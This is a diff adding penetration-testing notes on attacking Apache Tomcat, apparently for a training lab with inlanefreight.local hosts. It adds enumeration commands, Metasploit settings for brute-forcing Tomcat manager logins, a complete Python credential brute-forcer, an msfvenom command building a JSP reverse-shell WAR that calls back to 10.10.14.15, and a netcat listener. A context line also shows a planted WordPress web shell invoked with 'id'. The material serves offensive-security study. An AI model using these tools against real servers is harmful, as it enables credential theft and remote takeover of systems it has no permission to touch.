@@ -120,6 +120,64 @@ http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
 ### Apache Tomcat
 
 **What to Look For**
+curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
+gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+msfconsole then use module auxiliary(scanner/http/tomcat_mgr_login
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
+```bash
+mgr_brute.py
+python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
+#!/usr/bin/python
+
+import requests
+from termcolor import cprint
+import argparse
+
+parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")
+
+parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
+parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
+parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
+parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")
+
+args = parser.parse_args()
+
+url = args.url
+uri = args.path
+users_file = args.usernames
+passwords_file = args.passwords
+
+new_url = url + uri
+f_users = open(users_file, "rb")
+f_pass = open(passwords_file, "rb")
+usernames = [x.strip() for x in f_users]
+passwords = [x.strip() for x in f_pass]
+
+cprint("\n[+] Atacking.....", "red", attrs = ['bold'])
+
+for u in usernames:
+    for p in passwords:
+        r = requests.get(new_url,auth = (u, p))
+
+        if r.status_code == 200:
+            cprint("\n[+] Success!!", "green", attrs = ['bold'])
+            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
+            break
+    if r.status_code == 200:
+        break
+
+if r.status_code != 200:
+    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
+    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
+#print r.status_code
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
+nc -lnvp 4443
+
+**
 
 * `/manager/html` or `/host-manager`
 * Default credentials
